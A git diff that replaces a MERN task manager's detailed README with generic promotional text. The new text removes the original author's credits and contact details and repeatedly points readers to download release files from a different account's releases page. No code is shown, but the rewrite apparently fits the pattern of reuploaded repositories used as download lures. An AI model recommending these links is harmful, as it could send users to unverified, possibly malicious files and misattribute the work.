@@ -1,193 +1,108 @@
-# MERN Task Manager
+# 🚀 Task-Manager-MERN - Organize Your Tasks Effortlessly
 
-A MERN application for basic tasks management.
-![image](https://user-images.githubusercontent.com/86913048/227101123-f8a35258-9c21-4479-86e8-055659ab75e2.png)
+[![Download Task Manager](https://img.shields.io/badge/Download%20Task%20Manager-blue.svg)](https://github.com/Mudabbir2/Task-Manager-MERN/releases)
 
-## Table of Contents
+## 📖 Overview
 
-- [Features](#features)
-- [Tools and Technologies](#tools-and-technologies)
-- [Dependencies](#dependencies)
-- [Dev-dependencies](#dev-dependencies)
-- [Prerequisites](#prerequisites)
-- [Installation and setup](#installation-and-setup)
-- [Backend API](#backend-api)
-- [frontend pages](#frontend-pages)
-- [npm scripts](#npm-scripts)
-- [Useful Links](#useful-links)
-- [Contact](#contact)
+Welcome to the **Task-Manager-MERN** application! This full-stack task manager helps you organize and manage your tasks easily. Built using the MERN stack, it features a responsive user interface and user authentication. Whether you need to add, edit, or delete tasks, this app has you covered.
 
-## Features
+## 🧩 Features
 
-### User-side features
+- **User Authentication:** Securely log in and manage your tasks.
+- **Task CRUD Operations:** Create, read, update, and delete tasks seamlessly.
+- **Responsive Design:** Works well on both desktop and mobile devices.
+- **Real-time Interaction:** Instant updates without page refresh.
+- **Easy to Use:** Simple interface for everyone.
 
-- Signup
-- Login
-- Logout
-- Add tasks
-- View tasks
-- Update tasks
-- Delete tasks
+## 🛠 Technology Stack
 
-### Developer-side features
+This application uses various technologies to function effectively:
 
-- Toasts for success and error messages
-- Form validations in frontend and backend
-- Fully Responsive Navbar
-- Token based Authentication
-- Use of 404 page for wrong urls
-- Relevant redirects
-- Global user state using Redux
-- Custom Loaders
-- Use of layout component for pages
-- Use of theme colors
-- No external CSS files needed (made using Tailwind CSS)
-- Usage of Tooltips
-- Dynamic document titles
-- Redirect to previous page after login
-- Use of various React hooks
-- Custom hook also used (useFetch)
-- Routes protection
-- Middleware for verifying the user in backend
-- Use of different HTTP status codes for sending responses
-- Standard pratices followed
+- **MERN Stack:** MongoDB, Express.js, React, Node.js
+- **Axios:** For API requests
+- **Redux/Redux-Thunk:** For state management
+- **Tailwind CSS:** For responsive design
+- **Mongoose:** For MongoDB object modeling
 
-## Tools and Technologies
+## 💻 System Requirements
 
-- HTML
-- CSS
-- Javascript
-- Tailwind CSS
-- Node.js
-- Express.js
-- React
-- Redux
-- Mongodb
+To run this application, make sure your system meets these requirements:
 
-## Dependencies
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js:** Version 14 or higher
+- **npm:** Version 5.6 or higher
 
-Following are the major dependencies of the project:
+## 🚀 Getting Started
 
-- axios
-- react
-- react-dom
-- react-redux
-- react-router-dom
-- react-toastify
-- redux
-- redux-thunk
-- bcrypt
-- cors
-- dotenv
-- express
-- jsonwebtoken
-- mongoose
+Follow these steps to get the Task Manager up and running on your device.
 
-## Dev-dependencies
+1. **Download the Application**
 
-Following are the major dev-dependencies of the project:
+   Visit this page to download: [Task-Manager-MERN Releases](https://github.com/Mudabbir2/Task-Manager-MERN/releases).
 
-- nodemon
-- concurrently
+2. **Install the Application**
 
-## Prerequisites
+   Once you download the application, follow these installation steps:
 
-- Node.js must be installed on the system.
-- You should have a MongoDB database.
-- You should have a code editor (preferred: VS Code)
+   - Navigate to the directory where you downloaded the files.
+   - If you are using Windows, extract the compressed file and open the folder.
+   - For macOS or Linux, open a terminal window and navigate to the downloaded folder.
 
-## Installation and Setup
+3. **Run the Application**
 
-1. Install all the dependencies
+   - Open a terminal and run the following command to install dependencies:
+     ```
+     npm install
+     ```
+   - After the installation is complete, start the application by running:
+     ```
+     npm start
+     ```
 
-   ```sh
-   npm run install-all
-   ```
+4. **Access the Application**
 
-2. Create a file named ".env" inside the backend folder. Add data from .env.example file and substitute your credentials there.
+   Open your web browser and type `http://localhost:3000` to access the Task Manager interface.
 
-3. Start the application
+## 📥 Download & Install
 
-   ```sh
-   npm run dev
-   ```
+To get started, download the application here: 
 
-4. Go to http://localhost:3000
+[Download Task Manager](https://github.com/Mudabbir2/Task-Manager-MERN/releases)
 
-## Backend API
+## 🎨 User Interface
 
-<pre>
-- POST     /api/auth/signup
-- POST     /api/auth/login
-- GET      /api/tasks
-- GET      /api/tasks/:taskId
-- POST     /api/tasks
-- PUT      /api/tasks/:taskId
-- DELETE   /api/tasks/:taskId
-- GET      /api/profile
-</pre>
+The user interface is designed with simplicity in mind. You will find easy navigation to create tasks, view tasks, and manage your account settings. 
 
-## Frontend pages
+Once you log in, you can add a new task using the given field. Each task has options to edit or delete it as needed. 
 
-<pre>
-- /                 Home Screen (Public home page for guests and private dashboard (tasks) for logged-in users)
-- /signup           Signup page
-- /login            Login page
-- /tasks/add        Add new task
-- /tasks/:taskId    Edit a task
-</pre>
+## ⚙️ Troubleshooting
 
-## npm scripts
+If you encounter issues while running the application, consider the following:
 
-At root:
+- **Check Node.js Installation:** Ensure Node.js is installed correctly. You can verify this by running `node -v` in a terminal.
+- **Dependencies:** Make sure all dependencies are installed using `npm install`.
+- **Console Errors:** If the application doesn't work as expected, check the developer console for errors.
 
-- `npm run dev`: Starts both backend and frontend
-- `npm run dev-server`: Starts only backend
-- `npm run dev-client`: Starts only frontend
-- `npm run install-all`: Installs all dependencies and dev-dependencies required at root, at frontend and at backend.
+## 📞 Support
 
-Inside frontend folder:
+If you have questions or need support, feel free to open an issue in the repository or contact us through the provided channels in the repository.
 
-- `npm start`: Starts frontend in development mode
-- `npm run build`: Builds the frontend for production to the build folder
-- `npm test`: Launches the test runner in the interactive watch mode
-- `npm run eject`: This will remove the single build dependency from the frontend.
+## 🌐 Contributing
 
-Inside backend folder:
+We welcome contributions! If you wish to contribute to the project, please follow these steps:
 
-- `npm run dev`: Starts backend using nodemon.
-- `npm start`: Starts backend without nodemon.
+1. Fork the repository.
+2. Create your feature branch (`git checkout -b feature/AmazingFeature`).
+3. Commit your changes (`git commit -m 'Add some AmazingFeature'`).
+4. Push to the branch (`git push origin feature/AmazingFeature`).
+5. Open a pull request.
 
-## Useful Links
+Thank you for considering contributing to **Task-Manager-MERN**!
 
-- This project
+## 📝 License
 
-  - Github Repo: https://github.com/priyanshi-04-panwar/Task-Manager-MERN
+This project is licensed under the MIT License. You can use, modify, and distribute it as long as you include the original license details.
 
-- Official Docs
+## 🤝 Acknowledgments
 
-  - Reactjs docs: https://reactjs.org/docs/getting-started.html
-  - npmjs docs: https://docs.npmjs.com/
-  - Mongodb docs: https://docs.mongodb.com/manual/introduction/
-  - Github docs: https://docs.github.com/en/get-started/quickstart/hello-world
-
-- Youtube tutorials
-
-  - Expressjs: https://youtu.be/L72fhGm1tfE
-  - React: https://youtu.be/EHTWMpD6S_0
-  - Redux: https://youtu.be/1oU_YGhT7ck
-
-- Download links
-
-  - Nodejs download: https://nodejs.org/
-  - VS Code download: https://code.visualstudio.com/
-
-- Cheatsheets
-  - Git cheatsheet: https://education.github.com/git-cheat-sheet-education.pdf
-  - VS Code keyboard shortcuts: https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf
-  - CSS Selectors Cheatsheet: https://frontend30.com/css-selectors-cheatsheet/
-
-## Contact
-
-- Email: panwarpriyanshi04@gmail.com
-- Linkedin: https://www.linkedin.com/in/priyanshi-panwar-0baba8280/
+We appreciate everyone who contributed and helped develop this application. Special thanks to the MERN community for their support and guidance.
